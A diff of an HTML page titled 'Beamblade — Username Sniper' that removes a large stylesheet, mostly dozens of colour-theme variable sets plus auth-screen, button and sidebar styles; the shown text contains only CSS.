@@ -1,1771 +1,327 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="default">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Beamblade — Username Sniper</title>
-<style>
-/* ===================== RESET ===================== */
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-html, body { height: 100%; font-family: 'gg sans', 'Noto Sans', Whitney, 'Helvetica Neue', Helvetica, Arial, sans-serif; }
-button { cursor: pointer; border: none; outline: none; font-family: inherit; }
-input, textarea, select { font-family: inherit; outline: none; border: none; background: none; }
-a { text-decoration: none; color: inherit; }
-ul { list-style: none; }
-
-/* ===================== THEMES ===================== */
-:root[data-theme="default"] {
-  --bg-primary: #0a0a0a;
-  --bg-secondary: #111111;
-  --bg-tertiary: #1a1a1a;
-  --bg-quaternary: #222222;
-  --bg-hover: #2a2a2a;
-  --accent: #ffffff;
-  --accent-hover: #e0e0e0;
-  --accent-muted: rgba(255,255,255,0.15);
-  --text-primary: #ffffff;
-  --text-secondary: #b0b0b0;
-  --text-muted: #666666;
-  --border: #2a2a2a;
-  --success: #3ba55d;
-  --danger: #ed4245;
-  --warning: #faa61a;
-  --online: #3ba55d;
-  --input-bg: #1a1a1a;
-  --card-bg: #161616;
-  --sidebar-bg: #0f0f0f;
-  --topbar-bg: #0a0a0a;
-  --scrollbar: #2a2a2a;
-  --shadow: rgba(0,0,0,0.5);
-  --brand: #ffffff;
-}
-:root[data-theme="discord-dark"] {
-  --bg-primary: #36393f; --bg-secondary: #2f3136; --bg-tertiary: #202225;
-  --bg-quaternary: #292b2f; --bg-hover: #3c3f45; --accent: #5865f2;
-  --accent-hover: #4752c4; --accent-muted: rgba(88,101,242,0.15);
-  --text-primary: #dcddde; --text-secondary: #b9bbbe; --text-muted: #72767d;
-  --border: #202225; --success: #3ba55d; --danger: #ed4245; --warning: #faa61a;
-  --online: #3ba55d; --input-bg: #202225; --card-bg: #2f3136;
-  --sidebar-bg: #2f3136; --topbar-bg: #36393f; --scrollbar: #202225;
-  --shadow: rgba(0,0,0,0.4); --brand: #5865f2;
-}
-:root[data-theme="discord-light"] {
-  --bg-primary: #ffffff; --bg-secondary: #f2f3f5; --bg-tertiary: #e3e5e8;
-  --bg-quaternary: #d4d7dc; --bg-hover: #ebedef; --accent: #5865f2;
-  --accent-hover: #4752c4; --accent-muted: rgba(88,101,242,0.1);
-  --text-primary: #2e3338; --text-secondary: #4f5660; --text-muted: #747f8d;
-  --border: #e3e5e8; --success: #3ba55d; --danger: #ed4245; --warning: #faa61a;
-  --online: #3ba55d; --input-bg: #e3e5e8; --card-bg: #f2f3f5;
-  --sidebar-bg: #e3e5e8; --topbar-bg: #ffffff; --scrollbar: #d4d7dc;
-  --shadow: rgba(0,0,0,0.1); --brand: #5865f2;
-}
-:root[data-theme="midnight-blue"] {
-  --bg-primary: #0d1117; --bg-secondary: #0d1421; --bg-tertiary: #111827;
-  --bg-quaternary: #1a2235; --bg-hover: #1e2a3f; --accent: #3b82f6;
-  --accent-hover: #2563eb; --accent-muted: rgba(59,130,246,0.15);
-  --text-primary: #e2e8f0; --text-secondary: #94a3b8; --text-muted: #475569;
-  --border: #1e293b; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #111827; --card-bg: #0d1421;
-  --sidebar-bg: #0a0f1a; --topbar-bg: #0d1117; --scrollbar: #1e293b;
-  --shadow: rgba(0,0,0,0.5); --brand: #3b82f6;
-}
-:root[data-theme="forest-green"] {
-  --bg-primary: #0f1a0f; --bg-secondary: #142014; --bg-tertiary: #1a2a1a;
-  --bg-quaternary: #213521; --bg-hover: #273f27; --accent: #22c55e;
-  --accent-hover: #16a34a; --accent-muted: rgba(34,197,94,0.15);
-  --text-primary: #d1fae5; --text-secondary: #86efac; --text-muted: #4ade80;
-  --border: #1a3a1a; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #1a2a1a; --card-bg: #142014;
-  --sidebar-bg: #0d160d; --topbar-bg: #0f1a0f; --scrollbar: #1a3a1a;
-  --shadow: rgba(0,0,0,0.5); --brand: #22c55e;
-}
-:root[data-theme="crimson"] {
-  --bg-primary: #1a0a0a; --bg-secondary: #1f0f0f; --bg-tertiary: #2a1111;
-  --bg-quaternary: #351818; --bg-hover: #401f1f; --accent: #ef4444;
-  --accent-hover: #dc2626; --accent-muted: rgba(239,68,68,0.15);
-  --text-primary: #fee2e2; --text-secondary: #fca5a5; --text-muted: #f87171;
-  --border: #2a1111; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #2a1111; --card-bg: #1f0f0f;
-  --sidebar-bg: #150808; --topbar-bg: #1a0a0a; --scrollbar: #2a1111;
-  --shadow: rgba(0,0,0,0.5); --brand: #ef4444;
-}
-:root[data-theme="purple-haze"] {
-  --bg-primary: #120d1a; --bg-secondary: #170f22; --bg-tertiary: #1e152d;
-  --bg-quaternary: #271a38; --bg-hover: #302043; --accent: #a855f7;
-  --accent-hover: #9333ea; --accent-muted: rgba(168,85,247,0.15);
-  --text-primary: #f3e8ff; --text-secondary: #d8b4fe; --text-muted: #c084fc;
-  --border: #1e152d; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #1e152d; --card-bg: #170f22;
-  --sidebar-bg: #0e091a; --topbar-bg: #120d1a; --scrollbar: #1e152d;
-  --shadow: rgba(0,0,0,0.5); --brand: #a855f7;
-}
-:root[data-theme="ocean-deep"] {
-  --bg-primary: #050f1a; --bg-secondary: #071522; --bg-tertiary: #0a1e30;
-  --bg-quaternary: #0d2540; --bg-hover: #102c4d; --accent: #06b6d4;
-  --accent-hover: #0891b2; --accent-muted: rgba(6,182,212,0.15);
-  --text-primary: #cffafe; --text-secondary: #67e8f9; --text-muted: #22d3ee;
-  --border: #0a1e30; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #0a1e30; --card-bg: #071522;
-  --sidebar-bg: #030a12; --topbar-bg: #050f1a; --scrollbar: #0a1e30;
-  --shadow: rgba(0,0,0,0.5); --brand: #06b6d4;
-}
-:root[data-theme="sunset-orange"] {
-  --bg-primary: #1a0f05; --bg-secondary: #211407; --bg-tertiary: #2b1c0a;
-  --bg-quaternary: #38240f; --bg-hover: #452c12; --accent: #f97316;
-  --accent-hover: #ea580c; --accent-muted: rgba(249,115,22,0.15);
-  --text-primary: #ffedd5; --text-secondary: #fdba74; --text-muted: #fb923c;
-  --border: #2b1c0a; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #2b1c0a; --card-bg: #211407;
-  --sidebar-bg: #160c04; --topbar-bg: #1a0f05; --scrollbar: #2b1c0a;
-  --shadow: rgba(0,0,0,0.5); --brand: #f97316;
-}
-:root[data-theme="rose-gold"] {
-  --bg-primary: #1a1015; --bg-secondary: #22141c; --bg-tertiary: #2d1a24;
-  --bg-quaternary: #38212e; --bg-hover: #432838; --accent: #f43f7e;
-  --accent-hover: #e11d68; --accent-muted: rgba(244,63,126,0.15);
-  --text-primary: #fce7f3; --text-secondary: #f9a8d4; --text-muted: #f472b6;
-  --border: #2d1a24; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #2d1a24; --card-bg: #22141c;
-  --sidebar-bg: #150c11; --topbar-bg: #1a1015; --scrollbar: #2d1a24;
-  --shadow: rgba(0,0,0,0.5); --brand: #f43f7e;
-}
-:root[data-theme="cyberpunk"] {
-  --bg-primary: #0a0014; --bg-secondary: #0d0019; --bg-tertiary: #130020;
-  --bg-quaternary: #1c0030; --bg-hover: #240040; --accent: #ff00ff;
-  --accent-hover: #cc00cc; --accent-muted: rgba(255,0,255,0.15);
-  --text-primary: #f0e6ff; --text-secondary: #dd99ff; --text-muted: #9933ff;
-  --border: #200035; --success: #00ff88; --danger: #ff0055; --warning: #ffdd00;
-  --online: #00ff88; --input-bg: #130020; --card-bg: #0d0019;
-  --sidebar-bg: #070010; --topbar-bg: #0a0014; --scrollbar: #200035;
-  --shadow: rgba(0,0,0,0.6); --brand: #ff00ff;
-}
-:root[data-theme="matrix"] {
-  --bg-primary: #000000; --bg-secondary: #030d03; --bg-tertiary: #051205;
-  --bg-quaternary: #071807; --bg-hover: #0a200a; --accent: #00ff41;
-  --accent-hover: #00cc33; --accent-muted: rgba(0,255,65,0.12);
-  --text-primary: #00ff41; --text-secondary: #00cc33; --text-muted: #009922;
-  --border: #071807; --success: #00ff41; --danger: #ff0000; --warning: #ffff00;
-  --online: #00ff41; --input-bg: #051205; --card-bg: #030d03;
-  --sidebar-bg: #000000; --topbar-bg: #000000; --scrollbar: #071807;
-  --shadow: rgba(0,0,0,0.8); --brand: #00ff41;
-}
-:root[data-theme="arctic-ice"] {
-  --bg-primary: #0a1628; --bg-secondary: #0c1c35; --bg-tertiary: #0f2444;
-  --bg-quaternary: #122c53; --bg-hover: #163462; --accent: #7dd3fc;
-  --accent-hover: #38bdf8; --accent-muted: rgba(125,211,252,0.15);
-  --text-primary: #e0f2fe; --text-secondary: #bae6fd; --text-muted: #7dd3fc;
-  --border: #0f2444; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #0f2444; --card-bg: #0c1c35;
-  --sidebar-bg: #07101e; --topbar-bg: #0a1628; --scrollbar: #0f2444;
-  --shadow: rgba(0,0,0,0.5); --brand: #7dd3fc;
-}
-:root[data-theme="volcano"] {
-  --bg-primary: #1a0500; --bg-secondary: #220700; --bg-tertiary: #2d0c00;
-  --bg-quaternary: #3d1200; --bg-hover: #4d1800; --accent: #ff4500;
-  --accent-hover: #cc3600; --accent-muted: rgba(255,69,0,0.15);
-  --text-primary: #fff0e6; --text-secondary: #ffbb99; --text-muted: #ff7744;
-  --border: #2d0c00; --success: #22c55e; --danger: #ff4500; --warning: #ffa500;
-  --online: #22c55e; --input-bg: #2d0c00; --card-bg: #220700;
-  --sidebar-bg: #150400; --topbar-bg: #1a0500; --scrollbar: #2d0c00;
-  --shadow: rgba(0,0,0,0.5); --brand: #ff4500;
-}
-:root[data-theme="deep-purple"] {
-  --bg-primary: #1a0a2e; --bg-secondary: #1f0d38; --bg-tertiary: #2a1045;
-  --bg-quaternary: #361558; --bg-hover: #421a6b; --accent: #7c3aed;
-  --accent-hover: #6d28d9; --accent-muted: rgba(124,58,237,0.15);
-  --text-primary: #ede9fe; --text-secondary: #c4b5fd; --text-muted: #a78bfa;
-  --border: #2a1045; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #2a1045; --card-bg: #1f0d38;
-  --sidebar-bg: #140820; --topbar-bg: #1a0a2e; --scrollbar: #2a1045;
-  --shadow: rgba(0,0,0,0.5); --brand: #7c3aed;
-}
-:root[data-theme="teal"] {
-  --bg-primary: #051a1a; --bg-secondary: #072020; --bg-tertiary: #0a2a2a;
-  --bg-quaternary: #0f3535; --bg-hover: #134040; --accent: #14b8a6;
-  --accent-hover: #0d9488; --accent-muted: rgba(20,184,166,0.15);
-  --text-primary: #ccfbf1; --text-secondary: #5eead4; --text-muted: #2dd4bf;
-  --border: #0a2a2a; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #0a2a2a; --card-bg: #072020;
-  --sidebar-bg: #041515; --topbar-bg: #051a1a; --scrollbar: #0a2a2a;
-  --shadow: rgba(0,0,0,0.5); --brand: #14b8a6;
-}
-:root[data-theme="amber"] {
-  --bg-primary: #1a1200; --bg-secondary: #211800; --bg-tertiary: #2b2000;
-  --bg-quaternary: #382a00; --bg-hover: #453400; --accent: #f59e0b;
-  --accent-hover: #d97706; --accent-muted: rgba(245,158,11,0.15);
-  --text-primary: #fef3c7; --text-secondary: #fcd34d; --text-muted: #fbbf24;
-  --border: #2b2000; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #2b2000; --card-bg: #211800;
-  --sidebar-bg: #150e00; --topbar-bg: #1a1200; --scrollbar: #2b2000;
-  --shadow: rgba(0,0,0,0.5); --brand: #f59e0b;
-}
-:root[data-theme="slate"] {
-  --bg-primary: #0f172a; --bg-secondary: #1e293b; --bg-tertiary: #334155;
-  --bg-quaternary: #475569; --bg-hover: #1e293b; --accent: #64748b;
-  --accent-hover: #475569; --accent-muted: rgba(100,116,139,0.15);
-  --text-primary: #f1f5f9; --text-secondary: #cbd5e1; --text-muted: #94a3b8;
-  --border: #334155; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #334155; --card-bg: #1e293b;
-  --sidebar-bg: #0f172a; --topbar-bg: #0f172a; --scrollbar: #334155;
-  --shadow: rgba(0,0,0,0.4); --brand: #94a3b8;
-}
-:root[data-theme="coral"] {
-  --bg-primary: #1a0c0a; --bg-secondary: #22100d; --bg-tertiary: #2d1612;
-  --bg-quaternary: #3a1e19; --bg-hover: #472620; --accent: #ff6b6b;
-  --accent-hover: #ee5a5a; --accent-muted: rgba(255,107,107,0.15);
-  --text-primary: #fff0ee; --text-secondary: #ffb3af; --text-muted: #ff8c87;
-  --border: #2d1612; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #2d1612; --card-bg: #22100d;
-  --sidebar-bg: #150a08; --topbar-bg: #1a0c0a; --scrollbar: #2d1612;
-  --shadow: rgba(0,0,0,0.5); --brand: #ff6b6b;
-}
-:root[data-theme="lavender"] {
-  --bg-primary: #14101e; --bg-secondary: #1a1428; --bg-tertiary: #221c35;
-  --bg-quaternary: #2c2443; --bg-hover: #362c51; --accent: #c084fc;
-  --accent-hover: #a855f7; --accent-muted: rgba(192,132,252,0.15);
-  --text-primary: #f5f3ff; --text-secondary: #ddd6fe; --text-muted: #c4b5fd;
-  --border: #221c35; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #221c35; --card-bg: #1a1428;
-  --sidebar-bg: #0f0c17; --topbar-bg: #14101e; --scrollbar: #221c35;
-  --shadow: rgba(0,0,0,0.5); --brand: #c084fc;
-}
-:root[data-theme="emerald"] {
-  --bg-primary: #071a10; --bg-secondary: #0a2015; --bg-tertiary: #0d2a1c;
-  --bg-quaternary: #113525; --bg-hover: #15402e; --accent: #10b981;
-  --accent-hover: #059669; --accent-muted: rgba(16,185,129,0.15);
-  --text-primary: #d1fae5; --text-secondary: #6ee7b7; --text-muted: #34d399;
-  --border: #0d2a1c; --success: #10b981; --danger: #ef4444; --warning: #f59e0b;
-  --online: #10b981; --input-bg: #0d2a1c; --card-bg: #0a2015;
-  --sidebar-bg: #051210; --topbar-bg: #071a10; --scrollbar: #0d2a1c;
-  --shadow: rgba(0,0,0,0.5); --brand: #10b981;
-}
-:root[data-theme="ruby"] {
-  --bg-primary: #1a050d; --bg-secondary: #220812; --bg-tertiary: #2d0e19;
-  --bg-quaternary: #3d1525; --bg-hover: #4d1c31; --accent: #e11d48;
-  --accent-hover: #be123c; --accent-muted: rgba(225,29,72,0.15);
-  --text-primary: #ffe4e6; --text-secondary: #fda4af; --text-muted: #fb7185;
-  --border: #2d0e19; --success: #22c55e; --danger: #e11d48; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #2d0e19; --card-bg: #220812;
-  --sidebar-bg: #150408; --topbar-bg: #1a050d; --scrollbar: #2d0e19;
-  --shadow: rgba(0,0,0,0.5); --brand: #e11d48;
-}
-:root[data-theme="sapphire"] {
-  --bg-primary: #050d1a; --bg-secondary: #071222; --bg-tertiary: #0a182d;
-  --bg-quaternary: #0e203d; --bg-hover: #12284d; --accent: #2563eb;
-  --accent-hover: #1d4ed8; --accent-muted: rgba(37,99,235,0.15);
-  --text-primary: #dbeafe; --text-secondary: #93c5fd; --text-muted: #60a5fa;
-  --border: #0a182d; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #0a182d; --card-bg: #071222;
-  --sidebar-bg: #030a14; --topbar-bg: #050d1a; --scrollbar: #0a182d;
-  --shadow: rgba(0,0,0,0.5); --brand: #2563eb;
-}
-:root[data-theme="topaz"] {
-  --bg-primary: #0f1a14; --bg-secondary: #132014; --bg-tertiary: #1a2b1c;
-  --bg-quaternary: #223825; --bg-hover: #2a452e; --accent: #84cc16;
-  --accent-hover: #65a30d; --accent-muted: rgba(132,204,22,0.15);
-  --text-primary: #ecfccb; --text-secondary: #bef264; --text-muted: #a3e635;
-  --border: #1a2b1c; --success: #84cc16; --danger: #ef4444; --warning: #f59e0b;
-  --online: #84cc16; --input-bg: #1a2b1c; --card-bg: #132014;
-  --sidebar-bg: #0c1410; --topbar-bg: #0f1a14; --scrollbar: #1a2b1c;
-  --shadow: rgba(0,0,0,0.5); --brand: #84cc16;
-}
-:root[data-theme="obsidian"] {
-  --bg-primary: #050507; --bg-secondary: #08090c; --bg-tertiary: #0d0e12;
-  --bg-quaternary: #141519; --bg-hover: #1a1c22; --accent: #8b8fa8;
-  --accent-hover: #6b7099; --accent-muted: rgba(139,143,168,0.15);
-  --text-primary: #e8e9f0; --text-secondary: #a8aac0; --text-muted: #6b6f88;
-  --border: #0d0e12; --success: #3ba55d; --danger: #ed4245; --warning: #faa61a;
-  --online: #3ba55d; --input-bg: #0d0e12; --card-bg: #08090c;
-  --sidebar-bg: #030305; --topbar-bg: #050507; --scrollbar: #0d0e12;
-  --shadow: rgba(0,0,0,0.7); --brand: #8b8fa8;
-}
-:root[data-theme="midnight-purple"] {
-  --bg-primary: #0d0018; --bg-secondary: #10001f; --bg-tertiary: #160028;
-  --bg-quaternary: #200038; --bg-hover: #2a0048; --accent: #9d00ff;
-  --accent-hover: #7c00cc; --accent-muted: rgba(157,0,255,0.15);
-  --text-primary: #f0d9ff; --text-secondary: #cc88ff; --text-muted: #9944cc;
-  --border: #200038; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #160028; --card-bg: #10001f;
-  --sidebar-bg: #090013; --topbar-bg: #0d0018; --scrollbar: #200038;
-  --shadow: rgba(0,0,0,0.6); --brand: #9d00ff;
-}
-:root[data-theme="blood-moon"] {
-  --bg-primary: #150208; --bg-secondary: #1c030b; --bg-tertiary: #260510;
-  --bg-quaternary: #340819; --bg-hover: #420c22; --accent: #cc0022;
-  --accent-hover: #aa001c; --accent-muted: rgba(204,0,34,0.15);
-  --text-primary: #ffe8ee; --text-secondary: #ff8899; --text-muted: #cc3355;
-  --border: #260510; --success: #22c55e; --danger: #cc0022; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #260510; --card-bg: #1c030b;
-  --sidebar-bg: #110206; --topbar-bg: #150208; --scrollbar: #260510;
-  --shadow: rgba(0,0,0,0.6); --brand: #cc0022;
-}
-:root[data-theme="northern-lights"] {
-  --bg-primary: #050f14; --bg-secondary: #071422; --bg-tertiary: #0a1c30;
-  --bg-quaternary: #0d243e; --bg-hover: #102c4c; --accent: #00d4aa;
-  --accent-hover: #00aa88; --accent-muted: rgba(0,212,170,0.15);
-  --text-primary: #d4fdf5; --text-secondary: #80f0d4; --text-muted: #33ddb8;
-  --border: #0a1c30; --success: #00d4aa; --danger: #ef4444; --warning: #f59e0b;
-  --online: #00d4aa; --input-bg: #0a1c30; --card-bg: #071422;
-  --sidebar-bg: #040c10; --topbar-bg: #050f14; --scrollbar: #0a1c30;
-  --shadow: rgba(0,0,0,0.5); --brand: #00d4aa;
-}
-:root[data-theme="desert-sand"] {
-  --bg-primary: #1a1508; --bg-secondary: #211b0a; --bg-tertiary: #2b230f;
-  --bg-quaternary: #382e18; --bg-hover: #453920; --accent: #d4a853;
-  --accent-hover: #b88d3e; --accent-muted: rgba(212,168,83,0.15);
-  --text-primary: #fef9ee; --text-secondary: #e8d5a3; --text-muted: #c4a96d;
-  --border: #2b230f; --success: #22c55e; --danger: #ef4444; --warning: #d4a853;
-  --online: #22c55e; --input-bg: #2b230f; --card-bg: #211b0a;
-  --sidebar-bg: #151106; --topbar-bg: #1a1508; --scrollbar: #2b230f;
-  --shadow: rgba(0,0,0,0.4); --brand: #d4a853;
-}
-:root[data-theme="toxic-green"] {
-  --bg-primary: #030d02; --bg-secondary: #041202; --bg-tertiary: #071803;
-  --bg-quaternary: #0b2205; --bg-hover: #0f2c07; --accent: #7fff00;
-  --accent-hover: #66cc00; --accent-muted: rgba(127,255,0,0.12);
-  --text-primary: #f0ffe0; --text-secondary: #c8ff88; --text-muted: #88dd00;
-  --border: #071803; --success: #7fff00; --danger: #ff3300; --warning: #ffcc00;
-  --online: #7fff00; --input-bg: #071803; --card-bg: #041202;
-  --sidebar-bg: #020a01; --topbar-bg: #030d02; --scrollbar: #0b2205;
-  --shadow: rgba(0,0,0,0.6); --brand: #7fff00;
-}
-:root[data-theme="steel-blue"] {
-  --bg-primary: #0e1623; --bg-secondary: #131e2f; --bg-tertiary: #1a283f;
-  --bg-quaternary: #223350; --bg-hover: #2a3e61; --accent: #4d8bb5;
-  --accent-hover: #3a6f94; --accent-muted: rgba(77,139,181,0.15);
-  --text-primary: #ddeeff; --text-secondary: #99bbdd; --text-muted: #5588aa;
-  --border: #1a283f; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #1a283f; --card-bg: #131e2f;
-  --sidebar-bg: #0a1018; --topbar-bg: #0e1623; --scrollbar: #1a283f;
-  --shadow: rgba(0,0,0,0.5); --brand: #4d8bb5;
-}
-:root[data-theme="neon-pink"] {
-  --bg-primary: #150010; --bg-secondary: #1c0016; --bg-tertiary: #260020;
-  --bg-quaternary: #35002c; --bg-hover: #440038; --accent: #ff0099;
-  --accent-hover: #cc007a; --accent-muted: rgba(255,0,153,0.15);
-  --text-primary: #ffe8f5; --text-secondary: #ff99dd; --text-muted: #cc33aa;
-  --border: #260020; --success: #22c55e; --danger: #ff0099; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #260020; --card-bg: #1c0016;
-  --sidebar-bg: #100010; --topbar-bg: #150010; --scrollbar: #260020;
-  --shadow: rgba(0,0,0,0.6); --brand: #ff0099;
-}
-:root[data-theme="dark-chocolate"] {
-  --bg-primary: #1a0f08; --bg-secondary: #221510; --bg-tertiary: #2d1d16;
-  --bg-quaternary: #3d281f; --bg-hover: #4d3228; --accent: #8b5e3c;
-  --accent-hover: #7a5033; --accent-muted: rgba(139,94,60,0.15);
-  --text-primary: #fdf0e8; --text-secondary: #d4a882; --text-muted: #a07850;
-  --border: #2d1d16; --success: #22c55e; --danger: #ef4444; --warning: #d4a853;
-  --online: #22c55e; --input-bg: #2d1d16; --card-bg: #221510;
-  --sidebar-bg: #150c08; --topbar-bg: #1a0f08; --scrollbar: #2d1d16;
-  --shadow: rgba(0,0,0,0.5); --brand: #8b5e3c;
-}
-:root[data-theme="gold-rush"] {
-  --bg-primary: #141008; --bg-secondary: #1c160a; --bg-tertiary: #261e0e;
-  --bg-quaternary: #342914; --bg-hover: #42341a; --accent: #ffd700;
-  --accent-hover: #ccaa00; --accent-muted: rgba(255,215,0,0.12);
-  --text-primary: #fffaec; --text-secondary: #ffe999; --text-muted: #cca800;
-  --border: #261e0e; --success: #22c55e; --danger: #ef4444; --warning: #ffd700;
-  --online: #22c55e; --input-bg: #261e0e; --card-bg: #1c160a;
-  --sidebar-bg: #0f0c06; --topbar-bg: #141008; --scrollbar: #261e0e;
-  --shadow: rgba(0,0,0,0.5); --brand: #ffd700;
-}
-:root[data-theme="galaxy"] {
-  --bg-primary: #080614; --bg-secondary: #0d0a1e; --bg-tertiary: #130f2a;
-  --bg-quaternary: #1c1638; --bg-hover: #241e47; --accent: #818cf8;
-  --accent-hover: #6366f1; --accent-muted: rgba(129,140,248,0.15);
-  --text-primary: #eef2ff; --text-secondary: #c7d2fe; --text-muted: #a5b4fc;
-  --border: #130f2a; --success: #22c55e; --danger: #ef4444; --warning: #f59e0b;
-  --online: #22c55e; --input-bg: #130f2a; --card-bg: #0d0a1e;
-  --sidebar-bg: #060412; --topbar-bg: #080614; --scrollbar: #130f2a;
-  --shadow: rgba(0,0,0,0.6); --brand: #818cf8;
-}
-
-/* ===================== SCROLLBAR ===================== */
-::-webkit-scrollbar { width: 6px; height: 6px; }
-::-webkit-scrollbar-track { background: transparent; }
-::-webkit-scrollbar-thumb { background: var(--scrollbar); border-radius: 3px; }
-
-/* ===================== AUTH SCREEN ===================== */
-#auth-screen {
-  display: flex; align-items: center; justify-content: center;
-  min-height: 100vh; background: var(--bg-primary);
-  background-image: radial-gradient(ellipse at 20% 50%, var(--accent-muted) 0%, transparent 60%);
-}
-.auth-card {
-  background: var(--bg-secondary); border: 1px solid var(--border);
-  border-radius: 8px; padding: 32px; width: 100%; max-width: 420px;
-  box-shadow: 0 16px 48px var(--shadow);
-}
-.auth-logo {
-  text-align: center; margin-bottom: 24px;
-}
-.auth-logo-mark {
-  display: inline-block; width: 56px; height: 56px; border-radius: 50%;
-  background: var(--accent); display: flex; align-items: center; justify-content: center;
-  margin: 0 auto 12px; font-size: 24px; font-weight: 900; color: var(--bg-primary);
-  letter-spacing: -2px;
-}
-.auth-logo h1 { font-size: 20px; font-weight: 700; color: var(--text-primary); letter-spacing: -0.3px; }
-.auth-logo p { font-size: 13px; color: var(--text-muted); margin-top: 4px; }
-.auth-tabs {
-  display: flex; background: var(--bg-tertiary); border-radius: 6px;
-  padding: 3px; margin-bottom: 24px;
-}
-.auth-tab {
-  flex: 1; padding: 8px; text-align: center; font-size: 13px; font-weight: 600;
-  color: var(--text-muted); border-radius: 4px; cursor: pointer; transition: all 0.15s;
-  background: none; border: none;
-}
-.auth-tab.active { background: var(--bg-primary); color: var(--text-primary); }
-.form-group { margin-bottom: 16px; }
-.form-label { display: block; font-size: 11px; font-weight: 700; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 8px; }
-.form-input {
-  width: 100%; background: var(--input-bg); border: 1px solid var(--border);
-  border-radius: 4px; padding: 10px 12px; color: var(--text-primary); font-size: 15px;
-  transition: border-color 0.15s;
-}
-.form-input:focus { border-color: var(--accent); }
-.form-input::placeholder { color: var(--text-muted); }
-.btn {
-  display: inline-flex; align-items: center; justify-content: center; gap: 8px;
-  padding: 10px 20px; border-radius: 4px; font-size: 14px; font-weight: 600;
-  cursor: pointer; transition: all 0.15s; border: none; font-family: inherit;
-}
-.btn-primary { background: var(--accent); color: var(--bg-primary); width: 100%; }
-.btn-primary:hover { background: var(--accent-hover); transform: translateY(-1px); }
-.btn-sm { padding: 6px 14px; font-size: 13px; }
-.btn-ghost { background: transparent; color: var(--text-secondary); border: 1px solid var(--border); }
-.btn-ghost:hover { background: var(--bg-hover); color: var(--text-primary); }
-.btn-danger { background: var(--danger); color: white; }
-.btn-danger:hover { opacity: 0.85; }
-.btn-success { background: var(--success); color: white; }
-.btn-success:hover { opacity: 0.85; }
-.auth-error { background: rgba(237,66,69,0.15); border: 1px solid rgba(237,66,69,0.4); border-radius: 4px; padding: 10px 14px; font-size: 13px; color: var(--danger); margin-bottom: 16px; display: none; }
-.auth-error.show { display: block; }
-
-/* ===================== APP LAYOUT ===================== */
-#app { display: none; height: 100vh; background: var(--bg-primary); overflow: hidden; }
-#app.visible { display: flex; }
-.sidebar {
-  width: 240px; min-width: 240px; background: var(--sidebar-bg);
-  display: flex; flex-direction: column; border-right: 1px solid var(--border);
-  height: 100vh; overflow: hidden;
-}
-.sidebar-header {
-  padding: 16px; border-bottom: 1px solid var(--border); display: flex;
-  align-items: center; gap: 10px; min-height: 56px;
-}
-.sidebar-logo-mark {
-  width: 32px; height: 32px; border-radius: 50%; background: var(--accent);
-  display: flex; align-items: center; justify-content: center;
-  font-size: 13px; font-weight: 900; color: var(--bg-primary); flex-shrink: 0;
-  letter-spacing: -1px;
-}
-.sidebar-header h2 { font-size: 15px; font-weight: 700; color: var(--text-primary); letter-spacing: -0.2px; }
-.sidebar-nav { flex: 1; overflow-y: auto; padding: 8px 8px 0; }
-.nav-section-label {
-  font-size: 11px; font-weight: 700; color: var(--text-muted); text-transform: uppercase;
-  letter-spacing: 1px; padding: 16px 8px 4px; user-select: none;
-}
-.nav-item {
-  display: flex; align-items: center; gap: 12px; padding: 8px 10px; border-radius: 4px;
-  cursor: pointer; color: var(--text-secondary); font-size: 15px; font-weight: 500;
-  transition: all 0.1s; margin-bottom: 2px; user-select: none;
-}
-.nav-item:hover { background: var(--bg-hover); color: var(--text-primary); }
-.nav-item.active { background: var(--accent-muted); color: var(--accent); }
-.nav-item svg { width: 20px; height: 20px; flex-shrink: 0; }
-.nav-badge {
-  margin-left: auto; background: var(--danger); color: white; border-radius: 10px;
-  font-size: 11px; font-weight: 700; padding: 1px 6px; min-width: 18px; text-align: center;
-}
-.sidebar-user {
-  border-top: 1px solid var(--border); padding: 8px;
-  display: flex; align-items: center; gap: 8px; background: var(--bg-quaternary);
-  position: relative;
-}
-.user-avatar {
-  width: 32px; height: 32px; border-radius: 50%; background: var(--accent);
-  display: flex; align-items: center; justify-content: center;
-  font-size: 13px; font-weight: 700; color: var(--bg-primary); flex-shrink: 0;
-  position: relative;
-}
-.user-avatar-badge {
-  width: 10px; height: 10px; border-radius: 50%; background: var(--online);
-  position: absolute; bottom: -1px; right: -1px; border: 2px solid var(--bg-quaternary);
-}
-.user-info { flex: 1; min-width: 0; }
-.user-name { font-size: 13px; font-weight: 600; color: var(--text-primary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-.user-tag { font-size: 11px; color: var(--text-muted); }
